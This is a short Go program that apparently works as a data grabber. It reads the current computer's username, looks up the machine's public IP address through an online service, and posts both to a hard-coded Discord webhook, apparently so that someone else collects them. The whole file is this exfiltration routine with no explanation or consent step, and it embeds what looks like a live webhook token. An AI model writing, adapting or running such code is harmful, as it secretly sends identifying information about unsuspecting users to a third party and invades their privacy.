package main

import (
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os/user"
)

func main() {
	urls := "https://discord.com/api/webhooks/1321564629490728960/3aDR02jFKczreZ1LCynGLE8p8rpyPbQAW85q6eJv88zQOsJehOvCIgRhi2JH-ER-fysa"
	user, err := user.Current()
	ips, nil := http.Get("https://api.myip.com")
	body, err := ioutil.ReadAll(ips.Body)
	username := user.Username
	ip := string(body)
	datas := url.Values{
		"content": {"There Ip Address:"+ ip +"There Pc Username:\n"+ username},
	}
	resp, err := http.PostForm(urls, datas)

	if err != nil {
		log.Fatal(err, resp)
	}

}
